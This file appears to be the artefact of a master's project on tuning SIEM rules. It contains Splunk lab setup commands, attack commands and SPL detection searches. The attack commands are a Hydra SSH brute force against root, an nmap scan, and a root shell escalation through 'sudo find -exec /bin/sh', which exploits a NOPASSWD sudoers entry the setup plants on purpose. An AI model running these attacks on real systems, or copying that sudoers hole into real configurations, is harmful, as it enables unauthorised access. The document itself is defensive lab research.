@@ -1,0 +1,211 @@
+ARTEFACT CODE: SPL DETECTION SEARCHES, ATTACK COMMANDS AND LAB SETUP
+Author: Oluwadarasimi Sulaiman
+Module: 7COM1039 Advanced Computer Science Masters Project
+Supervisor: Dr Chidinma Chiejina
+Project Title: A Study of SIEM Rule Tuning Techniques for Reducing Alert Fatigue and False Positive Alerts Across Different Attack Scenarios in SOC Environments
+
+---
+
+SECTION 1: LAB ENVIRONMENT SETUP COMMANDS (Ubuntu Target Machine)
+
+# Expand virtual disk space
+sudo growpart /dev/sda 2
+sudo resize2fs /dev/sda2
+
+# Start Splunk and enable on boot
+sudo /opt/splunk/bin/splunk start
+sudo /opt/splunk/bin/splunk enable boot-start
+
+# Add log monitors to Splunk
+sudo /opt/splunk/bin/splunk add monitor /var/log/syslog -index main -sourcetype syslog
+sudo /opt/splunk/bin/splunk add monitor /var/log/auth.log -index main -sourcetype linux_secure
+
+# Enable UFW firewall logging for Nmap detection
+sudo ufw enable
+sudo ufw logging high
+
+# Add UFW log monitor to Splunk
+sudo /opt/splunk/bin/splunk add monitor /var/log/ufw.log -sourcetype ufw
+
+# Create seven employee accounts for benign baseline
+sudo useradd -m -s /bin/bash employee1
+sudo passwd employee1
+sudo useradd -m -s /bin/bash employee2
+sudo passwd employee2
+sudo useradd -m -s /bin/bash employee3
+sudo passwd employee3
+sudo useradd -m -s /bin/bash employee4
+sudo passwd employee4
+sudo useradd -m -s /bin/bash employee5
+sudo passwd employee5
+sudo useradd -m -s /bin/bash employee6
+sudo passwd employee6
+sudo useradd -m -s /bin/bash employee7
+sudo passwd employee7
+
+# Plant sudo misconfiguration for privilege escalation scenario
+which find
+sudo bash -c 'echo "employee1 ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/employee1'
+sudo cat /etc/sudoers.d/employee1
+
+---
+
+SECTION 2: ATTACK COMMANDS (Kali Linux Attacker Machine)
+
+# ATTACK 1: HYDRA BRUTE FORCE
+# Launched from Kali against Ubuntu SSH service
+# Attack window: 22 July 2026, 09:41 to 09:52
+# Produced 310 failed SSH authentication events against root
+
+date
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.80.130 -t 4 -V
+date
+
+# Note: if rockyou.txt is zipped run this first
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+---
+
+# ATTACK 2: SUDO-BASED PRIVILEGE ESCALATION
+# Launched from Kali via SSH as employee1
+# Attack window: 6 August 2026, 14:14 to 14:32
+# Produced 1 privileged sudo event in auth log
+
+# Step 1: Connect to Ubuntu as employee1
+ssh employee1@192.168.80.130
+
+# Step 2: Confirm standard user privileges
+id
+
+# Step 3: Identify the sudo misconfiguration
+sudo -l
+
+# Step 4: Exploit misconfiguration to launch root shell
+sudo find . -exec /bin/sh \; -quit
+
+# Step 5: Confirm root access
+whoami
+id
+
+---
+
+# ATTACK 3: NMAP PORT SCANNING
+# Launched from Kali against Ubuntu
+# Attack window: 12 August 2026, 18:04:48 to 18:05:55
+# Produced approximately 1000 distinct port contacts in UFW log
+
+# Note: initial fast scan produced only 10 logged ports due to rate limiting
+# Fix was to raise UFW logging to high and add scan delay
+
+date
+nmap -Pn -p 1-1000 --scan-delay 20ms 192.168.80.130
+date
+
+---
+
+SECTION 3: SPL DETECTION SEARCHES (Splunk Enterprise 9.4.1)
+
+# ATTACK SCENARIO 1: HYDRA BRUTE FORCE
+
+# Search 1: Naive Detection (Benign Window)
+# Returns all failed login events with no grouping or threshold
+# Result: 41 events
+
+index=main sourcetype=linux_secure "Failed password" earliest="07/28/2026:00:00:00" latest="08/03/2026:00:35:04"
+
+---
+
+# Search 2: V1 Grouped by Source IP (Benign Window)
+# Groups failed logins by source IP and flags any IP with more than 5 failures
+# Result: 1 blunt result showing shared IP 192.168.80.128
+
+index=main sourcetype=linux_secure "Failed password" earliest="07/28/2026:00:00:00" latest="08/03/2026:00:35:04"
+| rex field=_raw "from (?<attacker_ip>\d+\.\d+\.\d+\.\d+)"
+| stats count by attacker_ip
+| where count > 5
+
+---
+
+# Search 3: V2 Tuned by Target User (Benign Window)
+# Groups failed logins by targeted user account and flags accounts with more than 5 failures
+# Result: employee5 with 17 failures and employee1 with 6 failures
+
+index=main sourcetype=linux_secure "Failed password" earliest="07/28/2026:00:00:00" latest="08/03/2026:00:35:04"
+| rex field=_raw "Failed password for (invalid user )?(?<target_user>\w+) from"
+| stats count by target_user
+| where count > 5
+
+---
+
+# Search 4: Attack Window Detection Confirmation
+# Same tuned logic applied to attack window to confirm genuine attack is still detectable
+# Result: root with 310 failed logins
+
+index=main sourcetype=linux_secure "Failed password" earliest="07/22/2026:09:41:00" latest="07/22/2026:09:52:00"
+| rex field=_raw "Failed password for (invalid user )?(?<target_user>\w+) from"
+| stats count by target_user
+| where count > 5
+
+---
+
+# ATTACK SCENARIO 2: SUDO-BASED PRIVILEGE ESCALATION
+
+# Search 5: Raw Broad Search
+# Searches all sudo related events including machine generated noise
+# Result: 32 events
+
+index=main sourcetype=linux_secure sudo earliest="08/06/2026:14:14:00" latest="08/06/2026:14:32:00"
+| stats count
+
+---
+
+# Search 6: Refined to Real Commands Only
+# Filters to real user invoked sudo commands by requiring COMMAND field
+# Result: 11 events showing dara 10 and employee1 1
+
+index=main sourcetype=linux_secure process=sudo COMMAND=* earliest="08/06/2026:14:14:00" latest="08/06/2026:14:32:00"
+| rex "sudo:\s+(?<invoking_user>\w+)\s+:"
+| stats count by invoking_user
+
+---
+
+# Search 7: Tuned Rule
+# Restricts to commands run as root and excludes authorised administrator dara
+# Result: employee1 only with count 1
+
+index=main sourcetype=linux_secure process=sudo COMMAND=* USER=root earliest="08/06/2026:14:14:00" latest="08/06/2026:14:32:00"
+| rex "sudo:\s+(?<invoking_user>\w+)\s+:"
+| stats count by invoking_user
+| search NOT invoking_user=dara
+
+---
+
+# ATTACK SCENARIO 3: NMAP PORT SCANNING
+
+# Search 8: Nmap Benign Baseline
+# Shows maximum distinct ports contacted by any source during normal activity
+# Result: maximum 4 distinct ports per source
+
+index=main sourcetype=ufw earliest="08/12/2026:17:23:00" latest="08/12/2026:17:26:22"
+| stats dc(DPT) as distinct_ports by SRC
+
+---
+
+# Search 9: Naive Detection
+# Counts all firewall events in the combined window with no filtering
+# Result: approximately 4852 individual firewall events
+
+index=main sourcetype=ufw earliest="08/12/2026:17:23:00" latest="08/12/2026:18:06:00"
+| stats count
+
+---
+
+# Search 10: Tuned Rule
+# Changes unit of analysis to distinct destination ports per source
+# Flags any source contacting more than 10 distinct ports
+# Result: 1 identified scanning source which is Kali at 192.168.80.128
+
+index=main sourcetype=ufw earliest="08/12/2026:17:23:00" latest="08/12/2026:18:06:00"
+| stats dc(DPT) as distinct_ports by SRC
+| where distinct_ports > 10
+
